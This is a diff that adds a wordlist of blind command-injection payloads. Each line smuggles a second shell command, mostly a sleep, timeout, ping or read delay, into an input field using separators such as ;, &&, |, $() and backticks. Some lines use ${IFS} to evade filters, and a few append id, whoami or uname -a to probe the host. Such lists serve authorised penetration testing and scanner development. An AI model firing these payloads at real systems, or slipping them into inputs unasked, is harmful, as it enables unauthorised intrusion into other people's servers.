@@ -1,0 +1,87 @@
+;sleep 5
+;sleep 10
+;sleep 15
+&&sleep 5
+&&sleep 10
+&&sleep 15
+|sleep 5
+|sleep 10
+|sleep 15
+||sleep 5
+||sleep 10
+||sleep 15
+&sleep 5
+&sleep 10
+&sleep 15
+
+$(sleep 5)
+$(sleep 10)
+$(sleep 15)
+
+`sleep 5`
+`sleep 10`
+`sleep 15`
+
+;sleep${IFS}5
+&&sleep${IFS}5
+|sleep${IFS}5
+
+;sleep$IFS5
+&&sleep$IFS5
+|sleep$IFS5
+
+;timeout 5
+&&timeout 5
+|timeout 5
+
+;ping -c 5 127.0.0.1
+&&ping -c 5 127.0.0.1
+|ping -c 5 127.0.0.1
+
+;ping -n 5 127.0.0.1
+&&ping -n 5 127.0.0.1
+|ping -n 5 127.0.0.1
+
+;perl -e 'sleep 5'
+&&perl -e 'sleep 5'
+|perl -e 'sleep 5'
+
+;python -c 'import time; time.sleep(5)'
+&&python -c 'import time; time.sleep(5)'
+|python -c 'import time; time.sleep(5)'
+
+;php -r 'sleep(5);'
+&&php -r 'sleep(5);'
+|php -r 'sleep(5);'
+
+;sleep 5;id
+;sleep 5;whoami
+;sleep 5;uname -a
+
+&&sleep 5&&id
+&&sleep 5&&whoami
+
+|sleep 5|id
+|sleep 5|whoami
+
+$(sleep 5;id)
+$(sleep 5;whoami)
+
+`sleep 5;id`
+`sleep 5;whoami`
+
+;read -t 5
+&&read -t 5
+|read -t 5
+
+;sleep 3
+;sleep 7
+;sleep 12
+
+&&sleep 3
+&&sleep 7
+&&sleep 12
+
+|sleep 3
+|sleep 7
+|sleep 12
